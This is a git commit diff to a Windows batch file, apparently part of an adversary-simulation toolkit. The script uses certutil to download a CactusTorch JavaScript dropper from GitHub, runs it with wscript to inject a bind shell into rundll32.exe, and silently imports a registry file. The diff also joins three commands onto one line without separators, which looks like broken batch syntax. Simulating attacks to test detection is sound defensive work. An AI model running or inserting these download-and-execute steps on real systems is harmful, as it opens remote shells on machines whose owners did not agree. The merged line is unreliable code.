16663f054a2c6e301f9307543ba7a93e20adb1ca
NaimishP <36006376+NaimishP@users.noreply.github.com>
2020-03-25 15:06:53 -0500

    Update js-dropper.bat
    Single line command update
    Check for existing en-US.js file (or it will throw interactive notification to the system)

--- test-sets/defense-evasion/js-dropper.bat
+++ test-sets/defense-evasion/js-dropper.bat
@@ -3,15 +3,13 @@
 ECHO ===========================================================================
 ECHO CACTUSTORCH
 ECHO Using certutil to drop a CactusTorch shellcode lanucher injecting bind shell (port 1234/tcp) into rundll32.exe
-ping -n 5 127.0.0.1 > NUL
-
 ECHO Fixing possible problems with JavaScript on the system
-"%ZIP%" e -p%PASS% "%FILEARCH%" -aoa -o"%TEMP%" workfiles\jsfix.reg > NUL
-regedit.exe /s "%TEMP%\jsfix.reg"
+ping -n 5 127.0.0.1 > NUL "%ZIP%" e -p%PASS% "%FILEARCH%" -aoa -o"%TEMP%" workfiles\jsfix.reg > NUL regedit.exe /s "%TEMP%\jsfix.reg"
 
 ECHO Downloading the CactusTorch dropper (press Enter if it takes more than 20s)
 cmd.exe /c certutil.exe -urlcache -split -f https://raw.githubusercontent.com/NextronSystems/APTSimulator/master/download/cactus.js C:\Users\Public\en-US.js
 
 ECHO Executing the CactusTorch dropper
-start /B cmd /c wscript.exe C:\Users\Public\en-US.js
-
+if exist C:\Users\Public\en-US.js (
+  start /B cmd /c wscript.exe C:\Users\Public\en-US.js
+)
